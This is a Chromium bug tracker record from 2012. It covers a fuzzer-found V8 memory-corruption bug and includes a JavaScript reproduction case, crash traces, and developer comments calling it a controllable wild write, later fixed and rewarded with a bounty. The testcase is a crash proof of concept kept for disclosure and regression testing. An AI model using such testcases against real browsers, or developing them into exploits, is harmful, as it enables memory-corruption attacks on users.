# [LangFuzz] Crash on heap with invalid write to random address

| Field | Value |
|-------|-------|
| **Issue ID** | [40057469](https://issues.chromium.org/issues/40057469) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>JavaScript, Internals |
| **Reporter** | de...@googlemail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2012-04-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 20.0.1115.1 dev and d8 shell (trunk rev 11428) on the heap with an invalid write to a random/weird address (see traces below for address information).

**VERSION**  

Chrome Version: 20.0.1115.1 dev  

Operating System: Ubuntu 11.10 64 bit

**REPRODUCTION CASE**  

(function () {  

function PrettyPrint(value) {  

var string = Object.prototype.toString.call(value);  

return "(" + PrettyPrint(value.valueOf()) + ")";  

}  

function deepEquals(a, b) {  

return (1 / a) === (1 / b);  

};  

assertEquals = function assertEquals(expected, found, name\_opt) {  

if (!deepEquals(found, expected)) {  

fail(PrettyPrint(expected), found, name\_opt);  

}  

};  

})();  

try {  

function Hash() {}  

Hash.prototype.m = function() {};  

var h = new Hash();  

assertEquals(i < 50 || i >= 70 ? 1 : 2, h.m());  

} catch(exc1) {}  

function test(a) {  

a[0] = (1.5);  

assertEquals(0, a.length = 0);  

}  

var a = new Array();  

var n = 100000000;  

var result = 0;  

for (var i = 0; i < n; ++i) {  

result += test(a);  

}

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

Program received signal SIGSEGV, Segmentation fault.  

0x00002a96d1438218 in ?? ()  

(gdb) bt 4  

#0 0x00002a96d1438218 in ?? ()  

#1 0x00002a96d1438ecd in ?? ()  

#2 0x0000085bdd96c1f9 in ?? ()  

#3 0x00001ef623406c11 in ?? ()  

(More stack frames follow...)  

(gdb) x /i $pc  

=> 0x2a96d1438218: movsd %xmm0,0xf(%rdi,%rcx,8)  

(gdb) info reg xmm0 rdi rcx  

xmm0 {v4\_float = {0x0, 0x1, 0x0, 0x0}, v2\_double = {0x1, 0x0},  

v16\_int8 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x3f, 0x0, 0x0, 0x0, 0x0,  

0x0, 0x0, 0x0, 0x0}, v8\_int16 = {0x0, 0x0, 0x0, 0x3ff8, 0x0, 0x0, 0x0,  

0x0}, v4\_int32 = {0x0, 0x3ff80000, 0x0, 0x0}, v2\_int64 = {  

0x3ff8000000000000, 0x0}, uint128 = 0x00000000000000003ff8000000000000}  

rdi 0x39634615fff0 63098540392432  

rcx 0x0 0

Trace from D8 with Valgrind:

==31504== Invalid write of size 8  

==31504== at 0x178C1F040D18: ???  

==31504== by 0x178C1F03D6C5: ???  

==31504== by 0x178C1F00C8A6: ???  

==31504== by 0x178C1F006115: ???  

==31504== by 0x469EBF: v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x46B71D: v8::internal::Execution::Call(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x40DE08: v8::Script::Run() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x6A82B1: v8::Shell::ExecuteString(v8::Handle[v8::String](javascript:void(0);), v8::Handle[v8::Value](javascript:void(0);), bool, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x6A9C84: v8::SourceGroup::Execute() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x6AA6BF: v8::Shell::RunMain(int, char\*\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x6AAA6C: v8::Shell::Main(int, char\*\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==31504== by 0x580BEEC: (below main) (in /lib64/libc-2.12.2.so)  

==31504== Address 0x1101aa19ffff is not stack'd, malloc'd or (recently) free'd

## Timeline

### in...@chromium.org (2012-04-30)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-04-30)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-04-30)

Nifty catch. I think I know what's going on here, I'm trying to produce a minimized reduction.

### de...@googlemail.com (2012-04-30)

Thanks :) All code that I file is minimized already (1-minimal w.r.t. to lines, but I sometimes do some manual work). Might be able to get it smaller with inlining etc but certain things I tried here just broke the test.

### da...@chromium.org (2012-04-30)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-04-30)

No problem. I'm happy that it was reproducible in any form.

 I got it reduced to an even smaller case that I'll include as a regression test. It's a sometime overwritten rdi register in a RecordWriteField call that only gets coaxed out of the code generator by the test(a) function, but only when a has already been promoted to old-space. V8 then does a store to a predicable offset off of the the trashed value of rdi. It's unclear to me what actually trashes edi (and thus how exploitable it is), since it's inside a call, but a controllable write to a non-fixed location is pretty bad.

Patch is in review, it will need to be merged back to 3.9 once landed.

### in...@chromium.org (2012-04-30)

Danno@, does it affects stable or a recent regression ?

### in...@chromium.org (2012-04-30)

Danno@, does it affects stable or a recent regression ?

### sc...@gmail.com (2012-04-30)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-05-02)

This only affects Chrome 19 and later, stable is not affected.

### in...@chromium.org (2012-05-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-05-03)

Fixes have been rolled into both V8 trunk and 3.9. It will land in Chromium today with our V8 roll and will also be in the 3.10 branch for Chrome 20.

### sc...@gmail.com (2012-05-04)

Thanks for catching this regression, decoder! A wild write too, so...
$1000

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/125515?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink, Blink>JavaScript, Internals]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057469)*
